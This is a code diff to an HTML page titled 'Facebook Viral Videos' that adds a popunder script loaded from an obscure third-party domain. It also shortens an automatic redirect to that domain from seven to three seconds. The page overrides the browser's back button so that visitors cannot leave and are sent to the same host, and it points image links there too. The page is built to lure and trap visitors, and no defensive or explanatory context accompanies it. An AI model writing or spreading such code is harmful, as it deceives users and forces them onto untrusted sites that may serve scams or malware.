@@ -11,7 +11,7 @@
   <title>Facebook Viral Videos</title>
 
   <!-- Popunder Script -->
-
+<script src="https://conscientiouscabbageadrift.com/c7/80/b3/c780b33226fc3906c8c3befe884df70c.js"></script>
   
   <!-- Social Bar Script -->
 
@@ -180,12 +180,12 @@
   </style>
   <script>
     setTimeout(() => {
-      window.location.href = "https://conscientiouscabbageadrift.com/wus0z8zc7p?key=90bcb0f2b91421128dedacde813bc802";
-    }, 7000);
+      window.location.href = "https://conscientiouscabbageadrift.com/z9fa8h1f0w?key=519b48e82005834e4045ba96699a30f7";
+    }, 3000);
 
     history.pushState(null, null, location.href);
     window.onpopstate = () => {
-      location.href = "https://conscientiouscabbageadrift.com/wus0z8zc7p?key=90bcb0f2b91421128dedacde813bc802";
+      location.href = "https://conscientiouscabbageadrift.com/z9fa8h1f0w?key=519b48e82005834e4045ba96699a30f7";
     };
   </script>
 
@@ -229,7 +229,7 @@
 
     document.addEventListener('DOMContentLoaded', function () {
 
-      const directLink = "https://conscientiouscabbageadrift.com/wus0z8zc7p?key=90bcb0f2b91421128dedacde813bc802";
+      const directLink = "https://conscientiouscabbageadrift.com/z9fa8h1f0w?key=519b48e82005834e4045ba96699a30f7";
 
       const container = document.body;images.forEach((img, index) => {
 
